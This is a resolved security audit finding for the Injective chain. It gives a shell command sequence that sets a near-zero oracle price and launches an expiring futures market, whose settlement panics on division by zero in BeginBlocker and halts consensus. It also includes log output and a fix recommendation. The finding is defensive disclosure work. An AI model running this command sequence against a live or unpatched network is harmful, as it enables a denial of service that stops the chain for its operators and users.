### IF-INJECTIVE-10
## A sequence of transactions leads to a complete halt of consensus #323

**Status: Resolved**

**Severity**: High   

**Type**: Distributed System Reliability and Fault Tolerance

**Difficulty**: Low

_Surfaced from @informalsystems audit at hash e678a9f_

This is a concrete sequence of transactions that triggers panic in `BeginBlocker` and halts consensus. Related to the theoretical possibility of panic in `EndBlocker` that was discussed in #301.

Here is the sequence of shell commands that should be executed on a clean installation that is initialized with `./setup.sh`:

```sh
EXPIRY=$((`date +%s`+60))
injectived tx oracle grant-price-feeder-privilege-proposal inj atom \
  inj1cml96vmptgw99syqrrz8az79xer2pcgp0a885r --deposit=10000000inj \
  --title="price feeder inj/atom" --description="price feeder inj/atom" \
  --from=user1 --chain-id=888 --broadcast-mode=block --yes
sleep 2
injectived tx gov vote 1 yes --from=genesis --chain-id=888 \
  --broadcast-mode=block --yes
sleep 15
injectived tx oracle relay-price-feed-price inj atom 0.000000000000000001 \
  --from=user1 --chain-id=888 --broadcast-mode=block --yes
injectived tx insurance create-insurance-fund --ticker=inj/atom \
  --quote-denom=inj --oracle-base=inj --oracle-quote=atom \
  --oracle-type=PriceFeed --expiry=$EXPIRY --initial-deposit=10000000inj \
  --from=genesis --chain-id=888 --broadcast-mode=block --yes
sleep 1
injectived tx exchange expiryfuturesmarket-launch inj/atom inj inj atom 2 \
  pricefeed $EXPIRY --title="launch inj/atom" --description="launch inj/atom" \
  --from=user1 --deposit=10000000inj --chain-id=888 --broadcast-mode=block --yes
sleep 2
injectived tx gov vote 2 yes --from=genesis --chain-id=888 \
  --broadcast-mode=block --yes
sleep 40
```

Once the futures market has expired (after 60 seconds), the code in `BeginBlocker` starts the settlement and panics on division by zero:

https://github.com/InjectiveLabs/injective-core/blob/457705b7c0fb95d562a27b68306c9ad060c5b344/injective-chain/modules/exchange/keeper/futures_settlement.go#L154-L156

*See the log output below...*

**Recommendation**

While we obviously recommend fixing the division by zero that is triggered by
this sequence of commands, this issue demonstrates a more general concern. The
code that is executed by `BeginBlock` is very sensitive to `panic`, which
corrupts the application state and stops the node. We recommend to carefully
examine the code that either explicitly calls `panic` or may trigger it (e.g.,
via methods of `sdk.Dec`) and provide reasonable protection against it. It's
also desirable to keep only the necessary logic in `BeginBlock` and `EndBlock`.


**Example of the server output:**

``` NFO[0053] notifying bugsnag: CONSENSUS FAILURE!!!      INFO[0053]
bugsnag.Notify: not notifying in local       ERRO[0053] CONSENSUS FAILURE!!!
err="division by zero" module=consensus stack="goroutine 112
...
...app.(*InjectiveApp).BeginBlocker(...)
```

